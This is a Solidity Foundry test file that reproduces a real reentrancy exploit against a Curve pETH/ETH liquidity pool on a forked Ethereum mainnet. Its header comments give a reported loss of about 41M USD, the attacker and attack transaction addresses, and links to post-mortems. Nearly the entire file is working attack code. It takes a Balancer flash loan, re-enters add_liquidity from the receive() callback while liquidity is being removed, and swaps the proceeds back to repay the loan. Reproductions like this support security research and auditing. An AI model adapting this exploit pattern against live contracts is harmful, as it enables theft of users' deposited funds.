// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~41M USD$
// Attacker : https://etherscan.io/address/0x6ec21d1868743a44318c3c259a6d4953f9978538
// Attack Contract : https://etherscan.io/address/0x466b85b49ec0c5c1eb402d5ea3c4b88864ea0f04
// Vulnerable Contract : https://etherscan.io/address/0x6326debbaa15bcfe603d831e7d75f4fc10d9b43e
// Attack Tx : https://etherscan.io/tx/0xa84aa065ce61dbb1eb50ab6ae67fc31a9da50dd2c74eefd561661bfce2f1620c

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6326debbaa15bcfe603d831e7d75f4fc10d9b43e#code

// @Analysis
// Post-mortem : https://hackmd.io/@LlamaRisk/BJzSKHNjn
// Twitter Guy : https://twitter.com/vyperlang/status/1685692973051498497

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);

    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);

    function remove_liquidity(uint256 token_amount, uint256[2] memory min_amounts) external;
}

contract ContractTest is Test {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    IERC20 LP = IERC20(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    ICurve CurvePool = ICurve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_806_055);
        vm.label(address(WETH), "WETH");
        vm.label(address(pETH), "pETH");
        vm.label(address(CurvePool), "CurvePool");
        vm.label(address(Balancer), "Balancer");
    }

    function testExploit() external {
        deal(address(this), 0);
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 80_000 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.withdraw(WETH.balanceOf(address(this)));
        uint256[2] memory amount;
        amount[0] = 40_000 ether;
        amount[1] = 0;
        CurvePool.add_liquidity{value: 40_000 ether}(amount, 0);

        amount[0] = 0;
        CurvePool.remove_liquidity(LP.balanceOf(address(this)), amount); // reentrancy enter point
        nonce++;

        CurvePool.remove_liquidity(10_272 ether, amount);

        WETH.deposit{value: address(this).balance}();

        pETH.approve(address(CurvePool), pETH.balanceOf(address(this)));
        CurvePool.exchange(1, 0, pETH.balanceOf(address(this)), 0);

        WETH.deposit{value: address(this).balance}();

        WETH.transfer(address(Balancer), 80_000 ether);
    }

    receive() external payable {
        if (msg.sender == address(CurvePool) && nonce == 0) {
            uint256[2] memory amount;
            amount[0] = 40_000 ether;
            amount[1] = 0;
            CurvePool.add_liquidity{value: 40_000 ether}(amount, 0);
        }
    }
}
